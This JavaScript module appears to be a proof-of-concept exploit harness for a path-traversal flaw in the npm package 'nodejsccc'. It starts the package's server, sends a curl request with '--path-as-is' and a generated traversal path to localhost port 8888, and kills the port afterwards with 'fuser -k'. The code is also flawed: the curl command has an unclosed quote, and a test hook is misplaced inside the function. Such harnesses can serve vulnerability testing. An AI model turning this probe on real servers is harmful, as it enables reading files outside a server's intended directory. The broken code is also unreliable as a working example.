function exploitFunction(payload) {
  const { genstr } = payload;

  afterAll(() => {
    try {
      execSync("fuser -k 8888/tcp");
    } catch (e) {}
  });

  const path = require("path");  // Import the path module
  const { sleep } = require("sleep");
  const { exec } = require("child_process");

  let server = "node ./node_modules/nodejsccc/index.js";
  let exe = exec(server, (error, stdout) => {});

  sleep.sleep(2);

  let attack_string = `curl -v --path-as-is "http://127.0.0.1:8888${genstr(50)}`; // Using the payload's genstr function

  exec(attack_string, (error, stdout) => {
    if (stdout) {
      console.log(stdout);
    } else {
      console.error("No output received from the server.");
    }
  });
}

module.exports = { exploitFunction };